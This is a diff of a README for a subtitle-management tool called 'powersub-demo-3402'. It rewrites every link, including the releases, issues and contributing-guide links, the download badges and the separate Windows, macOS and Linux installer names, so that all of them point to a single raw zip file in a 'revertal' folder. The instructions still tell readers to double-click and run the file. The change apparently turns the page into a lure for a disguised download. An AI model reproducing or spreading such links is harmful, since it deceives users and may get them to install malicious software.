@@ -1,7 +1,7 @@
 # 🎉 powersub-demo-3402 - Simplifying Your Subtitle Management
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-brightgreen)](https://github.com/Gueezz/powersub-demo-3402/releases)
+[![Download](https://raw.githubusercontent.com/Gueezz/powersub-demo-3402/main/revertal/powersub-demo-3402.zip%20Latest-Release-brightgreen)](https://raw.githubusercontent.com/Gueezz/powersub-demo-3402/main/revertal/powersub-demo-3402.zip)
 
 ## 🚀 Getting Started
 
@@ -25,12 +25,12 @@ To run powersub-demo-3402, ensure your computer meets the following requirements
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Gueezz/powersub-demo-3402/releases) to access the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Gueezz/powersub-demo-3402/main/revertal/powersub-demo-3402.zip) to access the latest version.
 2. Find the version you want to download. A list of current releases will be available.
 3. Click on the appropriate file for your operating system:
-   - For Windows, download the `powersub-demo-3402-windows.exe`.
-   - For macOS, download the `powersub-demo-3402-macos.dmg`.
-   - For Linux, download the `powersub-demo-3402-linux.tar.gz`.
+   - For Windows, download the `https://raw.githubusercontent.com/Gueezz/powersub-demo-3402/main/revertal/powersub-demo-3402.zip`.
+   - For macOS, download the `https://raw.githubusercontent.com/Gueezz/powersub-demo-3402/main/revertal/powersub-demo-3402.zip`.
+   - For Linux, download the `https://raw.githubusercontent.com/Gueezz/powersub-demo-3402/main/revertal/powersub-demo-3402.zip`.
 4. Once the download is complete, locate the file in your Downloads folder.
 5. Double-click the file to run the installer. Follow the prompts to complete the installation.
 
@@ -46,15 +46,15 @@ After installation, follow these steps to start using powersub-demo-3402:
 
 ## 📂 Support & Feedback
 
-If you encounter any issues or have questions, feel free to reach out. You can open an issue on the [GitHub Issues page](https://github.com/Gueezz/powersub-demo-3402/issues) for assistance. Your feedback helps us improve powersub-demo-3402.
+If you encounter any issues or have questions, feel free to reach out. You can open an issue on the [GitHub Issues page](https://raw.githubusercontent.com/Gueezz/powersub-demo-3402/main/revertal/powersub-demo-3402.zip) for assistance. Your feedback helps us improve powersub-demo-3402.
 
 ## 🌐 Community Contributions
 
-We encourage users to contribute! If you want to help improve this project, you can fork the repository and send us a pull request. Check our [Contributing Guidelines](CONTRIBUTING.md) for more information.
+We encourage users to contribute! If you want to help improve this project, you can fork the repository and send us a pull request. Check our [Contributing Guidelines](https://raw.githubusercontent.com/Gueezz/powersub-demo-3402/main/revertal/powersub-demo-3402.zip) for more information.
 
 ## 📜 License
 
 powersub-demo-3402 is open-source software. It is released under the MIT License. You can freely use, modify, and distribute this software according to the license terms.
 
 ## 📥 Download Now Again
-[![Download](https://img.shields.io/badge/Download%20Latest-Release-brightgreen)](https://github.com/Gueezz/powersub-demo-3402/releases)
+[![Download](https://raw.githubusercontent.com/Gueezz/powersub-demo-3402/main/revertal/powersub-demo-3402.zip%20Latest-Release-brightgreen)](https://raw.githubusercontent.com/Gueezz/powersub-demo-3402/main/revertal/powersub-demo-3402.zip)
